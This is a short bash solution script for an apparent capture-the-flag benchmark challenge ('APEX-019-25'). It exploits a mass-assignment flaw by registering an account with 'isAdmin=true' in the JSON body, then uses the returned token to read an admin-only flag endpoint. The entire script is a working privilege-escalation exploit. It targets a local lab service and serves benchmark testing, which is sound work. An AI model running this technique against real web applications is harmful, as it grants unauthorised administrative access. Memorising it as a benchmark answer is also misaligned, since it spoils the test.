#!/usr/bin/env bash
# APEX-019-25 — "Mass Assignment Privilege Escalation" (tags: mass_assignment, orm)
#
# `/api/register` hands `req.body` to `User.create()` whole. The model has an
# `isAdmin` column, and nothing between the request and the ORM decides which
# columns a stranger is allowed to name, so the account arrives already
# administrative. The admin endpoint then hands over the flag.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex019-$$"
WHO="climber$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/api" --session "$SESSION" --new --capture >/dev/null

TOKEN="$(send "$SESSION" req_0 --create \
    --set method=POST --set path=/api/register \
    --set header.Content-Type=application/json \
    --set "json.username=$WHO" --set "json.email=$WHO@example.test" \
    --set json.password=password123 \
    --set json.isAdmin=true |
    python3 -c 'import json,sys
print(json.loads(sys.stdin.read().split("\n\n", 1)[-1]).get("token", ""))')"

send "$SESSION" req_0 --create \
    --set path=/api/admin/flag \
    --set "header.Authorization=Bearer $TOKEN" | flag
